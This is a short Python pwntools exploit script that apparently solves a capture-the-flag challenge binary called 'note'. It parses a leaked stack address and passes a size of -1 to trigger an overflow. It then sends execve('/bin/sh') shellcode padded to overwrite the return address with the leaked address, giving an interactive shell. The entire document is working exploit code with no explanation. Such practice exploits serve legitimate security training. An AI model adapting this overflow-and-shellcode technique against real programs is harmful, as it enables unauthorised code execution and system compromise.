from pwn import *

p = process('./note')
e = ELF('./note')
context(arch="amd64")

p.recvuntil('c@rZy myn0tE [')
stack = int(p.recvline()[:-2],16)
print hex(stack)

p.sendlineafter('Size : ','-1')

p.sendafter(': ',asm(shellcraft.execve("/bin/sh",0,0)).ljust(0x3f8)+p64(stack))

p.interactive()
